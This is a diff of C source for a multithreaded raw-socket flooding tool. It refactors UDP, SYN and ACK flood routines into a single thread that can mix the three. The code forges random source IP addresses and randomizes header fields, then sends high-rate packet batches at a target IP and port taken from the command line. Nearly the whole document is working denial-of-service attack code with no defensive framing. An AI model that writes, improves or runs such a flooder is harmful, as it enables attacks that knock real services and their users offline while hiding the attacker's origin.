@@ -23,40 +23,48 @@ int target_port;
 atomic_ullong total_packets;
 atomic_ullong total_bytes;
 
-uint64_t rng_state[4];
+uint64_t global_rng_seed_state[4];
 
 static inline uint64_t rotl(const uint64_t x, int k) {
     return (x << k) | (x >> (64 - k));
 }
 
+static _Thread_local uint64_t tl_rng_state[4];
+
 static inline uint64_t xoshiro256starstar(void) {
-    const uint64_t result = rotl(rng_state[1] * 5, 7) * 9;
-    const uint64_t t = rng_state[1] << 17;
-    rng_state[2] ^= rng_state[0];
-    rng_state[3] ^= rng_state[1];
-    rng_state[1] ^= rng_state[2];
-    rng_state[0] ^= rng_state[3];
-    rng_state[2] ^= t;
-    rng_state[3] = rotl(rng_state[3], 45);
+    const uint64_t result = rotl(tl_rng_state[1] * 5, 7) * 9;
+    const uint64_t t = tl_rng_state[1] << 17;
+    tl_rng_state[2] ^= tl_rng_state[0];
+    tl_rng_state[3] ^= tl_rng_state[1];
+    tl_rng_state[1] ^= tl_rng_state[2];
+    tl_rng_state[0] ^= tl_rng_state[3];
+    tl_rng_state[2] ^= t;
+    tl_rng_state[3] = rotl(tl_rng_state[3], 45);
     return result;
 }
 
-void seed_rng() {
+void init_global_rng() {
     FILE *f = fopen("/dev/urandom", "rb");
     if (f) {
-        if (fread(rng_state, sizeof(rng_state), 1, f) != 1) {
-            rng_state[0] = time(NULL) ^ clock();
-            rng_state[1] = getpid() ^ getppid();
-            rng_state[2] = time(NULL) << 16;
-            rng_state[3] = 0xDEADBEEFCAFEBABE;
+        if (fread(global_rng_seed_state, sizeof(global_rng_seed_state), 1, f) != 1) {
+            global_rng_seed_state[0] = time(NULL) ^ clock();
+            global_rng_seed_state[1] = getpid() ^ getppid();
+            global_rng_seed_state[2] = time(NULL) << 16;
+            global_rng_seed_state[3] = 0xDEADBEEFCAFEBABE;
         }
         fclose(f);
     } else {
-        rng_state[0] = time(NULL) ^ clock();
-        rng_state[1] = getpid() ^ getppid();
-        rng_state[2] = time(NULL) << 16;
-        rng_state[3] = 0xDEADBEEFCAFEBABE;
+        global_rng_seed_state[0] = time(NULL) ^ clock();
+        global_rng_seed_state[1] = getpid() ^ getppid();
+        global_rng_seed_state[2] = time(NULL) << 16;
+        global_rng_seed_state[3] = 0xDEADBEEFCAFEBABE;
     }
+}
+
+void init_thread_rng() {
+    memcpy(tl_rng_state, global_rng_seed_state, sizeof(global_rng_seed_state));
+    tl_rng_state[0] ^= (pthread_self() ^ sched_getcpu());
+    for(int i = 0; i < 4; i++) xoshiro256starstar();
 }
 
 static inline uint32_t fast_rand() {
@@ -166,20 +174,13 @@ void handle_signal(int sig) {
     running = 0;
 }
 
-void *udp_flood(void *arg) {
-    int cpu_id = *(int *)arg;
-    cpu_set_t cpuset;
-    CPU_ZERO(&cpuset);
-    CPU_SET(cpu_id, &cpuset);
-    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
-
-    thread_ctx_t *ctx = (thread_ctx_t *)malloc(sizeof(thread_ctx_t));
-    if (!ctx) return NULL;
-    memset(ctx, 0, sizeof(thread_ctx_t));
-    init_payload_pool(ctx);
-
+void setup_socket(thread_ctx_t *ctx) {
     ctx->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (ctx->sock < 0) { free(ctx); return NULL; }
+    if (ctx->sock < 0) {
+        if (errno == EPERM) fprintf(stderr, "Error: Raw socket requires root privileges. Run with sudo.\n");
+        free(ctx);
+        pthread_exit(NULL);
+    }
     
     int one = 1;
     int buff_size = 8 * 1024 * 1024;
@@ -188,292 +189,215 @@ void *udp_flood(void *arg) {
     setsockopt(ctx->sock, SOL_SOCKET, SO_SNDBUF, &buff_size, sizeof(buff_size));
     setsockopt(ctx->sock, SOL_SOCKET, SO_ZEROCOPY, &one, sizeof(one));
     setsockopt(ctx->sock, SOL_SOCKET, SO_BUSY_POLL, &busy_poll, sizeof(busy_poll));
+}
 
-    struct sockaddr_in sin;
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(target_port);
-    sin.sin_addr.s_addr = inet_addr(target_ip);
-
+void prepare_udp(thread_ctx_t *ctx, struct sockaddr_in sin) {
     for (int i = 0; i < BATCH_SIZE; i++) {
         struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
         struct udphdr *udph = (struct udphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
-        
-        memcpy(ctx->datagrams[i] + sizeof(struct iphdr) + sizeof(struct udphdr), 
-               ctx->payload_pool[i % POOL_SIZE], MAX_PAYLOAD);
-
-        iph->ihl = 5;
-        iph->version = 4;
+        memcpy(ctx->datagrams[i] + sizeof(struct iphdr) + sizeof(struct udphdr), ctx->payload_pool[i % POOL_SIZE], MAX_PAYLOAD);
+        iph->ihl = 5; iph->version = 4;
         iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD;
         iph->protocol = IPPROTO_UDP;
         iph->daddr = sin.sin_addr.s_addr;
-        iph->frag_off = htons(0x2000 | (fast_rand() % 8191));
-
         udph->dest = htons(target_port);
         udph->len = htons(sizeof(struct udphdr) + MAX_PAYLOAD);
         udph->check = 0;
-
         ctx->sins[i] = sin;
         ctx->iovecs[i].iov_base = ctx->datagrams[i];
         ctx->iovecs[i].iov_len = iph->tot_len;
-
         memset(&ctx->msgs[i], 0, sizeof(struct mmsghdr));
         ctx->msgs[i].msg_hdr.msg_name = &ctx->sins[i];
         ctx->msgs[i].msg_hdr.msg_namelen = sizeof(sin);
         ctx->msgs[i].msg_hdr.msg_iov = &ctx->iovecs[i];
         ctx->msgs[i].msg_hdr.msg_iovlen = 1;
     }
-
-    pthread_t reaper_th;
-    pthread_create(&reaper_th, NULL, zerocopy_reaper, ctx);
-
-    while (running) {
-        for (int i = 0; i < BATCH_SIZE; i++) {
-            struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
-            struct udphdr *udph = (struct udphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
-
-            iph->saddr = get_random_ip();
-            iph->id = htons(fast_rand() & 0xFFFF);
-            iph->ttl = (fast_rand() % 128) + 32;
-            iph->tos = fast_rand() & 0xFF;
-            iph->frag_off = htons(0x2000 | (fast_rand() % 8191));
-            iph->check = 0;
-            iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
-
-            udph->source = htons(fast_rand() % 64512 + 1024);
-        }
-
-        sendmmsg(ctx->sock, ctx->msgs, BATCH_SIZE, MSG_DONTWAIT | MSG_ZEROCOPY);
-        atomic_fetch_add(&total_packets, BATCH_SIZE);
-        atomic_fetch_add(&total_bytes, BATCH_SIZE * (sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD));
-    }
-    
-    pthread_cancel(reaper_th);
-    pthread_join(reaper_th, NULL);
-    close(ctx->sock);
-    free(ctx);
-    return NULL;
 }
 
-void *syn_flood(void *arg) {
-    int cpu_id = *(int *)arg;
-    cpu_set_t cpuset;
-    CPU_ZERO(&cpuset);
-    CPU_SET(cpu_id, &cpuset);
-    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
-
-    thread_ctx_t *ctx = (thread_ctx_t *)malloc(sizeof(thread_ctx_t));
-    if (!ctx) return NULL;
-    memset(ctx, 0, sizeof(thread_ctx_t));
-    init_payload_pool(ctx);
-
-    ctx->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (ctx->sock < 0) { free(ctx); return NULL; }
-    
-    int one = 1;
-    int buff_size = 8 * 1024 * 1024;
-    int busy_poll = 50;
-    setsockopt(ctx->sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-    setsockopt(ctx->sock, SOL_SOCKET, SO_SNDBUF, &buff_size, sizeof(buff_size));
-    setsockopt(ctx->sock, SOL_SOCKET, SO_ZEROCOPY, &one, sizeof(one));
-    setsockopt(ctx->sock, SOL_SOCKET, SO_BUSY_POLL, &busy_poll, sizeof(busy_poll));
-
-    struct sockaddr_in sin;
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(target_port);
-    sin.sin_addr.s_addr = inet_addr(target_ip);
-
+void prepare_syn(thread_ctx_t *ctx, struct sockaddr_in sin) {
     int tcp_opt_len = 16;
-
     for (int i = 0; i < BATCH_SIZE; i++) {
         struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
         struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
         char *tcp_opts = ctx->datagrams[i] + sizeof(struct iphdr) + sizeof(struct tcphdr);
-
         tcp_opts[0] = 2; tcp_opts[1] = 4; tcp_opts[2] = 0x05; tcp_opts[3] = 0xb4;
         tcp_opts[4] = 4; tcp_opts[5] = 2;
         tcp_opts[6] = 8; tcp_opts[7] = 10; tcp_opts[8] = 0; tcp_opts[9] = 0;
         *((uint16_t*)(tcp_opts + 10)) = htons(fast_rand() & 0xFFFF);
         *((uint16_t*)(tcp_opts + 12)) = 0;
         tcp_opts[14] = 1; tcp_opts[15] = 3; tcp_opts[16] = 3; tcp_opts[17] = 7;
-
-        iph->ihl = 5;
-        iph->version = 4;
+        iph->ihl = 5; iph->version = 4;
         iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + tcp_opt_len;
         iph->protocol = IPPROTO_TCP;
         iph->daddr = sin.sin_addr.s_addr;
-
         tcph->doff = (sizeof(struct tcphdr) + tcp_opt_len) / 4;
         tcph->dest = htons(target_port);
         tcph->syn = 1;
         tcph->window = htons(64240);
-        tcph->urg_ptr = htons(fast_rand() & 0xFFFF);
-
         ctx->sins[i] = sin;
         ctx->iovecs[i].iov_base = ctx->datagrams[i];
         ctx->iovecs[i].iov_len = iph->tot_len;
-
         memset(&ctx->msgs[i], 0, sizeof(struct mmsghdr));
         ctx->msgs[i].msg_hdr.msg_name = &ctx->sins[i];
         ctx->msgs[i].msg_hdr.msg_namelen = sizeof(sin);
         ctx->msgs[i].msg_hdr.msg_iov = &ctx->iovecs[i];
         ctx->msgs[i].msg_hdr.msg_iovlen = 1;
     }
+}
 
+void prepare_ack(thread_ctx_t *ctx, struct sockaddr_in sin) {
+    int payload_len = 1024;
+    for (int i = 0; i < BATCH_SIZE; i++) {
+        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
+        struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
+        char *payload = ctx->datagrams[i] + sizeof(struct iphdr) + sizeof(struct tcphdr);
+        memcpy(payload, ctx->payload_pool[i % POOL_SIZE], payload_len);
+        iph->ihl = 5; iph->version = 4;
+        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
+        iph->protocol = IPPROTO_TCP;
+        iph->daddr = sin.sin_addr.s_addr;
+        tcph->dest = htons(target_port);
+        tcph->doff = 5;
+        tcph->ack = 1;
+        tcph->psh = 1;
+        tcph->window = htons(65535);
+        ctx->sins[i] = sin;
+        ctx->iovecs[i].iov_base = ctx->datagrams[i];
+        ctx->iovecs[i].iov_len = iph->tot_len;
+        memset(&ctx->msgs[i], 0, sizeof(struct mmsghdr));
+        ctx->msgs[i].msg_hdr.msg_name = &ctx->sins[i];
+        ctx->msgs[i].msg_hdr.msg_namelen = sizeof(sin);
+        ctx->msgs[i].msg_hdr.msg_iov = &ctx->iovecs[i];
+        ctx->msgs[i].msg_hdr.msg_iovlen = 1;
+    }
+}
+
+void update_udp(thread_ctx_t *ctx) {
+    for (int i = 0; i < BATCH_SIZE; i++) {
+        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
+        struct udphdr *udph = (struct udphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
+        iph->saddr = get_random_ip();
+        iph->id = htons(fast_rand() & 0xFFFF);
+        iph->ttl = (fast_rand() % 128) + 32;
+        iph->tos = fast_rand() & 0xFF;
+        iph->frag_off = htons(0x2000 | (fast_rand() % 8191));
+        iph->check = 0;
+        iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
+        udph->source = htons(fast_rand() % 64512 + 1024);
+    }
+}
+
+void update_syn(thread_ctx_t *ctx, struct sockaddr_in sin) {
+    int tcp_opt_len = 16;
     struct pseudo_header psh;
     psh.destination_address = sin.sin_addr.s_addr;
     psh.placeholder = 0;
     psh.protocol = IPPROTO_TCP;
     psh.tcp_length = htons(sizeof(struct tcphdr) + tcp_opt_len);
-
-    pthread_t reaper_th;
-    pthread_create(&reaper_th, NULL, zerocopy_reaper, ctx);
-
-    while (running) {
-        for (int i = 0; i < BATCH_SIZE; i++) {
-            struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
-            struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
-
-            iph->saddr = get_random_ip();
-            iph->id = htons(fast_rand() & 0xFFFF);
-            iph->ttl = (fast_rand() % 128) + 32;
-            iph->tos = fast_rand() & 0xFF;
-            iph->frag_off = htons(0x2000);
-            iph->check = 0;
-            iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
-
-            tcph->source = htons(fast_rand() % 64512 + 1024);
-            tcph->seq = htonl(fast_rand());
-            tcph->check = 0;
-
-            psh.source_address = iph->saddr;
-
-            memcpy(ctx->pseudogram, &psh, sizeof(psh));
-            memcpy(ctx->pseudogram + sizeof(psh), tcph, sizeof(struct tcphdr) + tcp_opt_len);
-            tcph->check = csum_fast((unsigned short *)ctx->pseudogram, sizeof(psh) + sizeof(struct tcphdr) + tcp_opt_len);
-        }
-
-        sendmmsg(ctx->sock, ctx->msgs, BATCH_SIZE, MSG_DONTWAIT | MSG_ZEROCOPY);
-        atomic_fetch_add(&total_packets, BATCH_SIZE);
-        atomic_fetch_add(&total_bytes, BATCH_SIZE * (sizeof(struct iphdr) + sizeof(struct tcphdr) + tcp_opt_len));
+    for (int i = 0; i < BATCH_SIZE; i++) {
+        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
+        struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
+        iph->saddr = get_random_ip();
+        iph->id = htons(fast_rand() & 0xFFFF);
+        iph->ttl = (fast_rand() % 128) + 32;
+        iph->tos = fast_rand() & 0xFF;
+        iph->frag_off = htons(0x2000);
+        iph->check = 0;
+        iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
+        tcph->source = htons(fast_rand() % 64512 + 1024);
+        tcph->seq = htonl(fast_rand());
+        tcph->check = 0;
+        psh.source_address = iph->saddr;
+        memcpy(ctx->pseudogram, &psh, sizeof(psh));
+        memcpy(ctx->pseudogram + sizeof(psh), tcph, sizeof(struct tcphdr) + tcp_opt_len);
+        tcph->check = csum_fast((unsigned short *)ctx->pseudogram, sizeof(psh) + sizeof(struct tcphdr) + tcp_opt_len);
     }
-
-    pthread_cancel(reaper_th);
-    pthread_join(reaper_th, NULL);
-    close(ctx->sock);
-    free(ctx);
-    return NULL;
 }
 
-void *ack_flood(void *arg) {
+void update_ack(thread_ctx_t *ctx, struct sockaddr_in sin) {
+    int payload_len = 1024;
+    struct pseudo_header psh;
+    psh.destination_address = sin.sin_addr.s_addr;
+    psh.placeholder = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.tcp_length = htons(sizeof(struct tcphdr) + payload_len);
+    for (int i = 0; i < BATCH_SIZE; i++) {
+        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
+        struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
+        iph->saddr = get_random_ip();
+        iph->id = htons(fast_rand() & 0xFFFF);
+        iph->ttl = (fast_rand() % 64) + 64;
+        iph->frag_off = htons(fast_rand() & 0x1FFF);
+        iph->check = 0;
+        iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
+        tcph->source = htons(fast_rand() % 64512 + 1024);
+        tcph->seq = htonl(fast_rand());
+        tcph->ack_seq = htonl(fast_rand());
+        tcph->check = 0;
+        psh.source_address = iph->saddr;
+        memcpy(ctx->pseudogram, &psh, sizeof(psh));
+        memcpy(ctx->pseudogram + sizeof(psh), tcph, sizeof(struct tcphdr) + payload_len);
+        tcph->check = csum_fast((unsigned short *)ctx->pseudogram, sizeof(psh) + sizeof(struct tcphdr) + payload_len);
+    }
+}
+
+void *flood_thread(void *arg) {
     int cpu_id = *(int *)arg;
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset);
     CPU_SET(cpu_id, &cpuset);
     pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
 
+    init_thread_rng();
+
     thread_ctx_t *ctx = (thread_ctx_t *)malloc(sizeof(thread_ctx_t));
     if (!ctx) return NULL;
     memset(ctx, 0, sizeof(thread_ctx_t));
     init_payload_pool(ctx);
-
-    ctx->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (ctx->sock < 0) { free(ctx); return NULL; }
-    
-    int one = 1;
-    int buff_size = 8 * 1024 * 1024;
-    int busy_poll = 50;
-    setsockopt(ctx->sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-    setsockopt(ctx->sock, SOL_SOCKET, SO_SNDBUF, &buff_size, sizeof(buff_size));
-    setsockopt(ctx->sock, SOL_SOCKET, SO_ZEROCOPY, &one, sizeof(one));
-    setsockopt(ctx->sock, SOL_SOCKET, SO_BUSY_POLL, &busy_poll, sizeof(busy_poll));
+    setup_socket(ctx);
 
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_port = htons(target_port);
     sin.sin_addr.s_addr = inet_addr(target_ip);
 
-    int payload_len = 1024;
-
-    for (int i = 0; i < BATCH_SIZE; i++) {
-        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
-        struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
-        char *payload = ctx->datagrams[i] + sizeof(struct iphdr) + sizeof(struct tcphdr);
-
-        memcpy(payload, ctx->payload_pool[i % POOL_SIZE], payload_len);
-
-        iph->ihl = 5;
-        iph->version = 4;
-        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
-        iph->protocol = IPPROTO_TCP;
-        iph->daddr = sin.sin_addr.s_addr;
-
-        tcph->dest = htons(target_port);
-        tcph->doff = 5;
-        tcph->ack = 1;
-        tcph->psh = 1;
-        tcph->window = htons(65535);
-
-        ctx->sins[i] = sin;
-        ctx->iovecs[i].iov_base = ctx->datagrams[i];
-        ctx->iovecs[i].iov_len = iph->tot_len;
-
-        memset(&ctx->msgs[i], 0, sizeof(struct mmsghdr));
-        ctx->msgs[i].msg_hdr.msg_name = &ctx->sins[i];
-        ctx->msgs[i].msg_hdr.msg_namelen = sizeof(sin);
-        ctx->msgs[i].msg_hdr.msg_iov = &ctx->iovecs[i];
-        ctx->msgs[i].msg_hdr.msg_iovlen = 1;
-    }
-
-    struct pseudo_header psh;
-    psh.destination_address = sin.sin_addr.s_addr;
-    psh.placeholder = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = htons(sizeof(struct tcphdr) + payload_len);
-
     pthread_t reaper_th;
     pthread_create(&reaper_th, NULL, zerocopy_reaper, ctx);
 
+    int current_mode = -1;
+
     while (running) {
-        for (int i = 0; i < BATCH_SIZE; i++) {
-            struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
-            struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
-
-            iph->saddr = get_random_ip();
-            iph->id = htons(fast_rand() & 0xFFFF);
-            iph->ttl = (fast_rand() % 64) + 64;
-            iph->frag_off = htons(fast_rand() & 0x1FFF);
-            iph->check = 0;
-            iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
-
-            tcph->source = htons(fast_rand() % 64512 + 1024);
-            tcph->seq = htonl(fast_rand());
-            tcph->ack_seq = htonl(fast_rand());
-            tcph->check = 0;
-
-            psh.source_address = iph->saddr;
-
-            memcpy(ctx->pseudogram, &psh, sizeof(psh));
-            memcpy(ctx->pseudogram + sizeof(psh), tcph, sizeof(struct tcphdr) + payload_len);
-            tcph->check = csum_fast((unsigned short *)ctx->pseudogram, sizeof(psh) + sizeof(struct tcphdr) + payload_len);
+        int chosen_mode;
+        if (strcmp(method, "mix") == 0) {
+            chosen_mode = fast_rand() % 3;
+        } else if (strcmp(method, "udp") == 0) {
+            chosen_mode = 0;
+        } else if (strcmp(method, "syn") == 0) {
+            chosen_mode = 1;
+        } else {
+            chosen_mode = 2;
         }
+
+        if (chosen_mode != current_mode) {
+            if (chosen_mode == 0) prepare_udp(ctx, sin);
+            else if (chosen_mode == 1) prepare_syn(ctx, sin);
+            else prepare_ack(ctx, sin);
+            current_mode = chosen_mode;
+        }
+
+        if (current_mode == 0) update_udp(ctx);
+        else if (current_mode == 1) update_syn(ctx, sin);
+        else update_ack(ctx, sin);
 
         sendmmsg(ctx->sock, ctx->msgs, BATCH_SIZE, MSG_DONTWAIT | MSG_ZEROCOPY);
         atomic_fetch_add(&total_packets, BATCH_SIZE);
-        atomic_fetch_add(&total_bytes, BATCH_SIZE * (sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len));
+        atomic_fetch_add(&total_bytes, BATCH_SIZE * ctx->iovecs[0].iov_len);
     }
 
     pthread_cancel(reaper_th);
     pthread_join(reaper_th, NULL);
     close(ctx->sock);
     free(ctx);
-    return NULL;
-}
-
-void *mix_flood(void *arg) {
-    uint32_t r = fast_rand() % 3;
-    if (r == 0) udp_flood(arg);
-    else if (r == 1) syn_flood(arg);
-    else ack_flood(arg);
     return NULL;
 }
 
@@ -485,7 +409,6 @@ int main(int argc, char *argv[]) {
 
     strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
     target_port = atoi(argv[2]);
-    char method[32];
     strncpy(method, argv[3], sizeof(method) - 1);
 
     int auto_threads = sysconf(_SC_NPROCESSORS_ONLN) * 2;
@@ -493,24 +416,15 @@ int main(int argc, char *argv[]) {
 
     atomic_store(&total_packets, 0);
     atomic_store(&total_bytes, 0);
-    seed_rng();
+    init_global_rng();
     signal(SIGINT, handle_signal);
 
     pthread_t *th = (pthread_t *)malloc(auto_threads * sizeof(pthread_t));
     int *cpu_ids = (int *)malloc(auto_threads * sizeof(int));
-    void *(*func)(void *) = NULL;
-
-    if (strcmp(method, "udp") == 0) func = udp_flood;
-    else if (strcmp(method, "syn") == 0) func = syn_flood;
-    else if (strcmp(method, "ack") == 0) func = ack_flood;
-    else if (strcmp(method, "mix") == 0) func = mix_flood;
-    else {
-        exit(1);
-    }
 
     for (int i = 0; i < auto_threads; i++) {
         cpu_ids[i] = i % sysconf(_SC_NPROCESSORS_ONLN);
-        pthread_create(&th[i], NULL, func, &cpu_ids[i]);
+        pthread_create(&th[i], NULL, flood_thread, &cpu_ids[i]);
     }
 
     while (running) pause();
